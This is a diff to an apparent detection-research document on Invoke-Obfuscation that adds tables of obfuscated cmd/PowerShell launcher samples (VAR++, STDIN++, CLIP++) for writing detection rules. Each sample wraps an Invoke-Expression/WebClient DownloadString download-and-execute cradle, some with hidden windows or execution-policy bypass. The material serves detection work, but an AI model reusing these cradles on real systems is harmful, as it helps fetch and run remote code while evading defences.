@@ -198,7 +198,7 @@ you can copy the results from all cases for one or more obfuscation methods and 
    <p>STRING\3</p>
   </td>
   <td>
-   <p><strong>Covered by the great author himself (<i>if you'll be able to implement a non case sensitive regex</i>), even for the method commented out in the code:</strong></p>
+   <p><strong>Covered by the Invoke-Obfuscation author himself (<i>if you'll be able to implement a non case sensitive regex</i>), even for the method commented out in the code:</strong></p>
    <p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_invoke_obfuscation_obfuscated_iex.yml">Rule # 1</a></p>
    <p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_invoke_obfuscation_obfuscated_iex_commandline.yml">Rule # 2</a></p>
    <p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_invoke_obfuscation_obfuscated_iex_services.yml">Rule # 3</a></p>
@@ -589,14 +589,87 @@ you can copy the results from all cases for one or more obfuscation methods and 
 
 ### VAR++ LAUNCHER OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
-
+<table style="word-break: keep-all;">
+ <tr>
+  <th align="center">Case #</th>
+  <th align="center">Option</th>
+  <th align="center">Results</th>
+  <th align="center">Comments</th>
+ </tr>
+ <tr>
+  <td align="center">20</td>
+  <td align="center">LAUNCHER\VAR++\*</td>
+  <td>
+   <p><strong>Options LAUNCHER\VAR++\0 - LAUNCHER\VAR++\8 of this launcher just apply different PS keys the same way as <a href="https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#ps-launcher-obfuscation"> LAUNCHER\PS\* (case 10)</a>, so in this case we should only hunt for VAR++ indicators:</strong></p>
+   <p>C:\wINDOwS\SYStEM32\CmD  /C   "SeT  jxGL=Invoke-Expression (New-Object Net.WebClient).DownloadString&&Set   wtI=poweRsHELL     ^^^&(  \"{1}{0}\"-f'ex','I' ) ( (  .(\"{1}{0}\" -f'I','gc' ) ( \"{0}{1}{2}\" -f'E','nv',':jXgL')).\"v`AluE\" ) &&   C:\wINDOwS\SYStEM32\CmD  /C%wTi%"</p>
+   <p>c:\WiNDOWS\sYSTEm32\CmD.exE  /C   "sEt   DeJLz=Invoke-Expression (New-Object Net.WebClient).DownloadString&&set  yBKM=PoWERShelL  -noeX       ^^^&(\"{2}{0}{1}\"-f '-ItE','m','seT')  ( 'V'  + 'a'+  'RiAblE:z8J'  +'U2'  + 'l'  ) ([TYpE]( \"{2}{3}{0}{1}\"-f 'e','NT','e','NViRONM'  )   )    ;   ^^^&  (   ( [sTrIng]${VE`Rbo`SepReFER`Ence})[1,3] +  'X'-joIN'')(   (    (.('gI') ('V' + 'a'  + 'RIAbLe:z8j' +  'u2'  +'l'  ) ).vALUe::( \"{2}{5}{0}{1}{6}{4}{3}\" -f 'IRo','Nm','GETE','ABlE','I','nv','enTVAr').Invoke((  \"{0}{1}\"-f'd','ejLz' ),(  \"{1}{2}{0}\"-f'cEss','P','RO') ))   )&& c:\WiNDOWS\sYSTEm32\CmD.exE  /C %ybkm%"</p>
+   <p>cMD /c   "SeT   xClr=Invoke-Expression (New-Object Net.WebClient).DownloadString&&SET  Fck=pOWersheLL -NOninTe   ${L3`V`BF6}  = [TypE](  \"{0}{2}{1}\"-F'envIro','t','NMEN'  );   ${ExEcUtionCoNteXt}.\"i`NvOkeCoM`manD\".\"I`NVOk`es`CrIPT\"(( (  .( \"{2}{1}{0}\" -f 'itEM','-ChIld','GeT'  ) variaBLE:l3VbF6    ).vAlue::(\"{1}{0}{4}{2}{3}\" -f 'V','GEtEn','riA','BLE','IronMenTvA' ).Invoke(( \"{0}{1}\"-f'XC','lr'  ),(\"{1}{0}\"-f'eSs','PROc') ))    )&& cMD /c %FcK%"</p>
+   <p>C:\WINdOws\sYStEM32\cMD   /C   "Set   GjQ=Invoke-Expression (New-Object Net.WebClient).DownloadString&&seT  QbzO=poWersHELL  -nOl     (.(\"{0}{1}{2}{3}\"-f 'g','Et','-VA','RIAblE') (\"{0}{2}{1}\" -f'EXECUTiOnCOnT','t','eX'  )).\"va`lUE\".\"INV`okeC`o`MmAnd\".(\"{2}{1}{3}{0}\" -f'rIpt','keS','invO','c' ).Invoke(  ( .(\"{2}{0}{1}\"-f'-I','Tem','gET'  ) ( \"{0}{1}\"-f 'eNV:G','jQ' ) ).\"VAl`UE\"  )&& C:\WINdOws\sYStEM32\cMD   /C %qBZO%"</p>
+   <p>C:\WIndOwS\sYStem32\Cmd.Exe   /C  "Set  IdwE=Invoke-Expression (New-Object Net.WebClient).DownloadString&&seT   QExio=pOwersHelL -NOPROFiL      Set-iTEM  VArIAbLe:8u5q (  [TYpe]( \"{0}{2}{1}\" -f 'eNVi','Nt','ronme'  )   );  ( .(  \"{2}{1}{0}\"-f '-iTem','eT','G') ( \"{0}{2}{3}{1}\"-f 'VaRIa','X*xT','ble',':E') ).\"V`ALuE\".\"I`NV`Ok`ECO`mMand\".(\"{3}{2}{1}{0}\"-f't','RIp','c','invoKes' ).Invoke(    ( ${8u`5Q}::(\"{0}{1}{2}{5}{3}{6}{4}\"-f'g','et','E','roN','iabLe','NVI','MEnTVAR'  ).Invoke((  \"{1}{0}\" -f 'We','iD' ),( \"{0}{1}\"-f'pRo','cEss')  ) )   )&&  C:\WIndOwS\sYStem32\Cmd.Exe   /C%QexIO%"</p>
+   <p>C:\WINDoWs\SYsTeM32\Cmd   /C  "sEt  lzXrV=Invoke-Expression (New-Object Net.WebClient).DownloadString&&SeT   ytw=pOwErShelL -co      ^^^&(  ${s`helL`iD}[1]  + ${sh`El`liD}[13] +'x') (   (  .(\"{1}{0}\" -f 'm','iTE') ( \"{1}{2}{3}{0}\"-f 'V','E','n','v:lzxR' )).\"v`AluE\"   )&&C:\WINDoWs\SYsTeM32\Cmd   /C %yTW%"</p>
+   <p>CMD.EXe   /C "sEt  cDpyq=Invoke-Expression (New-Object Net.WebClient).DownloadString&&Set  kuxSF=pOWeRSHeLl  -WIndowsTyle  hIDDEN     (.(\"{0}{1}\" -f'C','HilDITem' ) (\"{1}{0}{2}\" -f 'v:CdPy','en','q' ) ).\"VA`LUe\"   ^^^|  ^^^&( ${verBOse`PreFE`R`ENCe}.(  \"{1}{0}\"-f'INg','ToSTR').Invoke(    )[1,3]+'X'-jOIn'')&&CMD.EXe   /C%kUXsF%"</p>
+   <p>cMD.ExE  /C "SET   BudG=Invoke-Expression (New-Object Net.WebClient).DownloadString&&SeT   KhJC=PowersHeLL  -exECUtiOn  bypasS        ^^^& ( 'sV')  ( \"{1}{2}{0}\" -f'17j','X','W6'  )  (  [tYPE](\"{0}{2}{1}\" -f'En','T','ViROnmeN'  )   ) ;  (  .( \"{1}{0}{2}\" -f'rI','VA','ABlE') (  \"{0}{2}{1}{3}\"-f'EXECUtiONC','Nt','o','eXt'  ) ).\"V`AluE\".\"Inv`okecom`Mand\".(\"{2}{1}{3}{0}\"-f 'ript','vOke','In','SC' ).Invoke((  $XW617j::(  \"{2}{3}{5}{0}{1}{4}{6}\"-f 'NmE','N','gEtEnv','Ir','tVArIAb','o','lE' ).Invoke(( \"{0}{1}\" -f'bUd','g'  ),(\"{1}{0}\"-f'SS','PROCE'  ) ) )  )&&   cMD.ExE  /C%KHjC%"</p>
+   <p>CMD /C"sET   KUR=Invoke-Expression (New-Object Net.WebClient).DownloadString&&Set   MxI=C:\wINDowS\sYsWow64\winDOWspoWERSheLl\V1.0\PowerShelL.EXe     ${ExEcut`IoN`cON`TExT}.\"invo`kEcoMm`A`ND\".(  \"{2}{1}{0}\" -f 'pt','EscRi','INvOk' ).Invoke( ( .(  \"{0}{1}\" -f'D','IR'  ) (  \"{0}{1}\"-f'ENV:kU','R')).\"vAl`Ue\" )&&  CMD /C%mXI%"</p>
+  </td>
+  <td align="left">These options just change the way of execution, it might be enough to just check for those keys</td>
+ </tr>
+</table> 
 
 ### STDIN++ LAUNCHER OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
+<table style="word-break: keep-all;">
+ <tr>
+  <th align="center">Case #</th>
+  <th align="center">Option</th>
+  <th align="center">Results</th>
+  <th align="center">Comments</th>
+ </tr>
+ <tr>
+  <td align="center">20</td>
+  <td align="center">LAUNCHER\STDIN++\*</td>
+  <td>
+   <p><strong>Options LAUNCHER\STDIN++\0 - LAUNCHER\STDIN++\8 of this launcher just apply different PS keys the same way as <a href="https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#ps-launcher-obfuscation"> LAUNCHER\PS\* (case 10)</a>, so in this case we should only hunt for STDIN++ indicators:</strong></p>
+   <p>cmD  /c "SEt  nEp=  Invoke-Expression (New-Object Net.WebClient).DownloadString  &&set  EcPq=Echo  (DIr vaRIAblE:*XeC*T).valuE.iNvOKeCOmMaNd.InVOKEscrIpT( ([eNViROnMenT]::geTenvIRONmentVArIabLE('nEP','PROCeSS')) )^|PowersHElL     (VArIABle 'eXeCUtIoNContext' -VAL).InVokeCoMmand.InvOkEscRipt(  ${InPuT} ) && cmD  /c %eCPQ%"</p>
+   <p>C:\wiNdOWs\SystEm32\cMD.EXe   /c  "sET  XnK=  Invoke-Expression (New-Object Net.WebClient).DownloadString &&  sET  PZVh=ECho  ${EXECutIoNcOnTExT}.inVokecommaNd.iNvoKeSCrIPt(  ([eNvirOnMEnT]::GETenVIrOnmENtVARIABLe('XNk','pRoceSS'))) ^| poweRSHelL -NoE      -  &&  C:\wiNdOWs\SystEm32\cMD.EXe   /c%PzVh%"</p>
+   <p>CmD.ExE/c   "SEt   jqP=  Invoke-Expression (New-Object Net.WebClient).DownloadString &&  sET  BvZ=eChO InVOKe-eXPreSsioN  ([enviRONMent]::GEteNVIrONmENTvArIAblE('JQP','pROceSS'))  ^| POWerSHELl -NoNinTE     $INPUt^^^| ^^^&( $sheLlid[1]+$ShELlid[13]+'x')&&  CmD.ExE/c%bVz%"</p>
+   <p>cMd.EXE  /C  "SET   RiJ= Invoke-Expression (New-Object Net.WebClient).DownloadString && sET  KTpFR=Echo ${eXEcuTIONcOnTEXT}.iNVOkeCommAND.INvOKeScrIpT( (GCi eNV:rIj).vaLUe )  ^|PoWeRsheLL -NOLoG    (GET-chiLDIteM 'VArIaBlE:ex*XT').vAlue.InvokECOMmand.iNvokEScrIpT($iNPut)&&  cMd.EXE  /C%ktpfR%"</p>
+   <p>CmD.EXE /C "SeT   khW=Invoke-Expression (New-Object Net.WebClient).DownloadString&&Set   XWPGa=ecHO ${EXECuTIonCOntext}.inVOKeCommand.iNVoKESCRipt((GeT-iTem EnV:khW).vaLuE  )  ^|PoWERsHell -nOproF      .( $Env:cOmSPec[4,26,25]-jOiN'')( ${inPuT} )   &&CmD.EXE /C%XWpGA%"</p>
+   <p>c:\wiNDOwS\syStem32\CMd.Exe   /C "sEt   xjIow=  Invoke-Expression (New-Object Net.WebClient).DownloadString&&sEt  niG=Echo iEx (GI ENv:XjIOW).valUE  ^|  powersheLl -coMm      (chIlditeM 'vARIaBle:eX*XT').vAlUE.iNvoKEcoMMaNd.invokEScrIpT( $InpuT  )&& c:\wiNDOwS\syStem32\CMd.Exe   /C %NIg%"</p>
+   <p>CMd/C "sEt   Guz= Invoke-Expression (New-Object Net.WebClient).DownloadString  &&set   Cpa=echO  INVoKe-exprESSiOn  (iteM env:gUZ).vALuE ^| POWeRSHElL  -wInD  hIddEn    ${ExecutioncOntexT}.invokECOmmaND.invokescriPt( ${iNpuT} ) &&  CMd/C%Cpa%"</p>
+   <p>C:\wInDOWS\sYsTEM32\cMD   /c "SET  RnK= Invoke-Expression (New-Object Net.WebClient).DownloadString &&sEt   ryP=ECHo  (GCi vaRIABlE:E*oNTe*).VaLUe.iNvokecOmMaNd.inVOKeScrIPt( ([eNVirONmENT]::GEtENVirOnMeNTvArIAblE('rNk','PROcEsS')) )  ^| PowershelL  -EXecu  byPAsS    $eXecutiOnCONTeXT.invokeCoMmAND.iNVOKEsCrIpT($iNPUT )  && C:\wInDOWS\sYsTEM32\cMD   /c %RyP%"</p>
+   <p>C:\winDowS\SysteM32\Cmd   /C  "set   sHM=Invoke-Expression (New-Object Net.WebClient).DownloadString  && SEt  gBc=ECHO  $eXECutionconTeXt.inVoKECOmmanD.InVoKESCripT(  ([ENVirOnment]::geTenVIrONMEnTvaRIAble('shM','PRoCEss')) )  ^| C:\WiNDoWS\SYSwoW64\WindoWSpoWerSHelL\V1.0\pOwersheLl.EXe    ^^^&( $PShOME[4]+$psHOMe[30]+'X') ( $InPUt)  && C:\winDowS\SysteM32\Cmd   /C %gbc%"</p>
+  </td>
+  <td align="left">These options just change the way of execution, it might be enough to just check for those keys</td>
+ </tr>
+</table> 
 
 ### CLIP++ LAUNCHER OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
-
+<table style="word-break: keep-all;">
+ <tr>
+  <th align="center">Case #</th>
+  <th align="center">Option</th>
+  <th align="center">Results</th>
+  <th align="center">Comments</th>
+ </tr>
+ <tr>
+  <td align="center">20</td>
+  <td align="center">LAUNCHER\CLIP++\*</td>
+  <td>
+   <p><strong>Options LAUNCHER\CLIP++\0 - LAUNCHER\CLIP++\8 of this launcher just apply different PS keys the same way as <a href="https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#ps-launcher-obfuscation"> LAUNCHER\PS\* (case 10)</a>, so in this case we should only hunt for CLIP++ indicators:</strong></p>
+   <p>C:\WINdoWS\sySteM32\CMd  /c  " ECho\Invoke-Expression (New-Object Net.WebClient).DownloadString|Clip.Exe&&C:\WINdoWS\sySteM32\CMd  /c  pOWerSheLl  -STa      .  ( \"{2}{0}{1}\"-f'dd-',(\"{0}{1}\" -f 'T','ype' ),'A'  ) -Assembly ( \"{4}{1}{3}{0}{2}\"-f (\"{0}{1}\" -f 'nd','ow'),(  \"{1}{0}\"-f'.W','stem' ),( \"{2}{1}{0}\" -f 'rms','Fo','s.'),'i','Sy')   ;  ${exeCUtIOnCONTeXT}.\"INV`oKECOM`m`ANd\".\"INV`ok`ESCriPT\"(  (  [sYSteM.wiNDoWS.forMs.ClIPboaRD]::( \"{2}{0}{1}\" -f'Ex','t',(\"{0}{1}\" -f'Get','t' )  ).\"iNvo`Ke\"(  ))   )   ;   [System.Windows.Forms.Clipboard]::(\"{1}{0}\" -f 'ar','Cle' ).\"in`V`oKE\"(   )"</p>
+   <p>C:\WInDows\System32\cMd  /c " echO Invoke-Expression (New-Object Net.WebClient).DownloadString |C:\wiNDOwS\SyStEm32\cLiP.exE &&C:\WInDows\System32\cMd  /c  poWErsheLl -sT -NoexiT   ^^^& (\"{0}{1}{2}\"-f 'Ad','d-T','ype'  ) -A (  \"{4}{0}{1}{2}{3}\"-f 'y',( \"{0}{2}{1}\"-f'stem','indow','.W' ),'s.F',( \"{0}{1}\"-f'orm','s' ),'S'  ) ;  ${EXEcUtIONcONtEXT}.\"IN`Vo`kECoMm`AnD\".\"I`N`VoKESCriPT\"(    (  [WInDoWS.FoRMS.ClipboArD]::(\"{0}{1}\"-f'GE',(\"{0}{1}\"-f 'TT','EXt')  ).\"INV`Oke\"(  )  )  )  ; [Windows.Forms.Clipboard]::(\"{0}{1}\" -f'C',(\"{0}{1}\" -f'le','ar' ) ).\"iN`V`oKe\"(    )"</p>
+   <p>C:\wiNdowS\syStEm32\cmd   /C" ecHO Invoke-Expression (New-Object Net.WebClient).DownloadString | clIp&&C:\wiNdowS\syStEm32\cmd   /CPoWeRSHEll -sta -NonIntERaCTI   ${nu`LL} = [System.Reflection.Assembly]::( \"{2}{1}{3}{0}\" -f(\"{0}{1}\" -f'l','Name' ),'it',( \"{1}{0}\"-f 'adW','Lo' ),(\"{0}{1}\" -f 'hPart','ia')).\"i`NvOke\"((\"{3}{4}{1}{0}{2}\" -f'Windows.For','tem.','ms','Sy','s'))   ;  ${eX`Ec`UT`ioN`coNteXt}.\"I`N`VOKEcOMm`And\".\"In`VOkES`CRipt\"(   ([WInDowS.fORmS.cLipbOArD]::( \"{1}{0}\"-f'EXt',(\"{1}{0}\" -f 'T','gET' )).\"INV`okE\"(    ) )   );    [Windows.Forms.Clipboard]::( \"{1}{0}{2}\"-f 'x',( \"{1}{0}\" -f 'tTe','Se' ),'t' ).\"i`NvoKe\"(' '  )"</p>
+   <p>C:\WINDowS\sYsTEM32\CmD.eXE   /C"  echo\Invoke-Expression (New-Object Net.WebClient).DownloadString| C:\WIndOWs\SYSteM32\CLip &&C:\WINDowS\sYsTEM32\CmD.eXE   /C   POWERSHeLL  -sT  -noL    [Void][System.Reflection.Assembly]::( \"{0}{3}{4}{1}{2}\" -f(  \"{0}{1}\"-f'Lo','adW'  ),( \"{0}{1}\"-f 'Par','t'),(  \"{0}{1}{2}\"-f 'ial','N','ame'),'it','h'  ).\"in`VO`KE\"( ( \"{3}{1}{4}{5}{2}{0}\"-f'rms','ystem.Windo','Fo','S','w','s.'  ))   ;  ( [wIndows.fOrms.cLIPBOArD]::(  \"{1}{0}\"-f'T',(  \"{1}{0}\" -f'tEX','gET'  )).\"i`Nvoke\"(    )  )   ^^^|  ^^^&  (  ( ^^^& ( \"{2}{1}{0}\"-f 'e',( \"{2}{1}{0}\"-f'IABl','aR','v'  ),(  \"{0}{1}\"-f'Get','-' )  ) ( \"{1}{0}\"-f'*','*MDr'  )).\"n`Ame\"[3,11,2]-jOin'')   ;  [Windows.Forms.Clipboard]::(  \"{0}{1}\" -f (\"{1}{0}\"-f'tT','Se' ),'ext').\"in`VoKe\"(' ' )"</p>
+   <p>C:\WINdOws\sYsTeM32\Cmd.EXE  /C"EcHO/Invoke-Expression (New-Object Net.WebClient).DownloadString |CLIp&&C:\WINdOws\sYsTeM32\Cmd.EXE  /C powErShELl  -StA  -NOpRoFIl     . (\"{2}{0}{1}\" -f'-T','ype','Add') -Assem ( \"{1}{3}{0}{4}{2}\" -f'ent','Pre',(\"{2}{0}{1}\"-f 'nCor','e','io' ),'s','at'  ) ; ( ^^^&(  \"{1}{0}{2}\" -f(  \"{0}{1}\"-f'rIab','L'),'va','e'  ) (  \"{1}{0}{4}{3}{2}\" -f'xEc','e','OncontEXt','tI','u' )  ).\"va`lUe\".\"invok`E`cOmM`AnD\".\"INv`o`k`EscRIPt\"(  ( [SySTEm.wINDoWs.CLipbOARd]::( \"{1}{0}\" -f'xt',(\"{0}{1}\"-f 'gEt','Te' )).\"i`NVO`ke\"(   ) )  )  ;   [System.Windows.Clipboard]::(\"{1}{0}\" -f't',( \"{0}{1}\" -f'Se','tTex')).\"INvo`KE\"(' ')"</p>
+   <p>CmD/C "Echo/Invoke-Expression (New-Object Net.WebClient).DownloadString|c:\windOWs\systEM32\ClIP &&CmD/C poweRshell  -ST -comMaNd      ^^^&  (  \"{0}{1}\"-f( \"{0}{1}\" -f'A','dd-'),(\"{0}{1}\"-f'Ty','pe'  )) -AssemblyNam (  \"{0}{3}{1}{2}\"-f(\"{0}{1}{2}\" -f'Pre','se','nt' ),'onC','ore','ati'  )  ; ${exECUtioncONText}.\"iNVOkEC`o`MMA`Nd\".\"I`N`VokESCR`IPT\"(  ([WInDowS.clIPBOARD]::(\"{0}{1}\" -f 'g',( \"{0}{1}\" -f'Ette','Xt' )).\"iN`V`OKE\"())  )  ;[Windows.Clipboard]::(\"{1}{0}\" -f'ear','Cl').\"iN`Voke\"(   )"</p>
+   <p>cmd  /C"  eChO\Invoke-Expression (New-Object Net.WebClient).DownloadString |CliP&&cmd  /C   pOWeRshELl -ST -WINdOwStY  HiddeN    ${U`A`TVRY}  = [System.Reflection.Assembly]::(  \"{0}{3}{4}{1}{2}\" -f (  \"{1}{0}\" -f'd','Loa'  ),'l',( \"{0}{1}\"-f 'N','ame'  ),( \"{2}{0}{1}\" -f'Pa','rti','With'  ),'a' ).\"in`VokE\"( (  \"{5}{2}{3}{6}{4}{0}{1}\" -f 'ws.','Forms','y','st','Windo','S','em.'  )) ;  ([wIndoWS.formS.cLipbOARD]::(  \"{1}{0}\"-f (\"{0}{1}\"-f 'e','tTExT'),'G'  ).\"inVO`kE\"(  ))  ^^^|^^^&  (   ${v`e`RbOsePRe`FErENCE}.(  \"{1}{2}{0}\"-f 'G','tos',( \"{1}{0}\" -f 'riN','t') ).\"In`V`OKe\"(    )[1,3]+'x'-JOIn'' )  ;   [Windows.Forms.Clipboard]::(\"{0}{1}\" -f 'C',( \"{1}{0}\"-f 'r','lea'  )  ).\"iN`VOke\"(  )"</p>
+   <p>c:\WINdoWS\SYsteM32\cmd.Exe  /c " Echo Invoke-Expression (New-Object Net.WebClient).DownloadString |C:\wInDows\sYSTEM32\ClIp.EXE&&c:\WINdoWS\SYsteM32\cmd.Exe  /c powERshelL  -EXEcUtionpol BYPaSs  -ST  ^^^&(\"{0}{2}{1}\"-f (  \"{0}{1}\"-f'Ad','d-T'),'pe','y'  ) -As (\"{2}{0}{1}{3}\" -f're','s','P',(\"{2}{1}{0}\"-f 're','nCo','entatio'  )  )  ;    ([WiNdOwS.cLIPBOArd]::(  \"{2}{1}{0}\" -f( \"{1}{0}\"-f 'tEXt','t' ),'e','G' ).\"INV`OKe\"(  )  )  ^^^|  . (   (  [sTRING]${ve`RBosEp`ReFe`Re`NcE} )[1,3] +  'x'-join'' )  ;   [Windows.Clipboard]::(\"{2}{1}{0}\" -f(\"{0}{1}\"-f't','Text'  ),'e','S'  ).\"In`VO`kE\"(  ' ')"</p>
+   <p>CMd/C   "  ecHo Invoke-Expression (New-Object Net.WebClient).DownloadString| C:\wiNdows\system32\ClIp.ExE&&CMd/Cc:\WinDows\sysWow64\wiNdowsPOWersHelL\v1.0\PoweRsHElL.exE -Sta     .  (\"{1}{0}{2}\" -f 'T',( \"{0}{1}\"-f 'A','dd-' ),'ype'  ) -AN (  \"{1}{0}{2}{3}{4}\"-f(\"{0}{2}{3}{1}\" -f 'tem','s.F','.','Window' ),'Sys','or','m','s'  )  ;   ${exECUTIOncONTeXT}.\"in`VokeC`O`MManD\".\"invOke`S`C`RipT\"(  ( [wiNDOWs.fOrmS.clIPbOARd]::(  \"{1}{2}{0}\"-f 't',(\"{0}{1}\" -f'gE','TT' ),'Ex'  ).\"in`V`OkE\"(  ) )  ) ;    [Windows.Forms.Clipboard]::(  \"{0}{1}\" -f (\"{1}{0}\"-f'lea','C'),'r' ).\"iNV`oke\"(    )"</p>
+  </td>
+  <td align="left">These options just change the way of execution, it might be enough to just check for those keys</td>
+ </tr>
+</table> 
 
 ### RUNDLL++ LAUNCHER OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
